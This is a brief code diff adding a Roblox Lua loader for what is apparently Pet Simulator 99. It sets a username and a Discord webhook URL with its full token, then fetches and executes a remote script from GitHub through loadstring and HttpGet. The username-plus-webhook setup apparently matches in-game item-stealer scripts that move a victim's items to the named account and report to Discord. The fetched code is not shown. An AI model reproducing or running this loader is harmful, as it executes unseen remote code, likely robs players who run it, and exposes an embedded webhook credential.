@@ -1,0 +1,6 @@
+Username = "Ynettery"
+Username = "Ynettery"
+Webhook = "https://discord.com/api/webhooks/1330977396840468600/ZpIOfjcPlsb18Kt9gKfUFBACwGpEODEpydn1aSzTfqMlsctOR1CCBIDFLfCz90kbqERJ"
+selectedLoadingScreen = "Select Loading" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
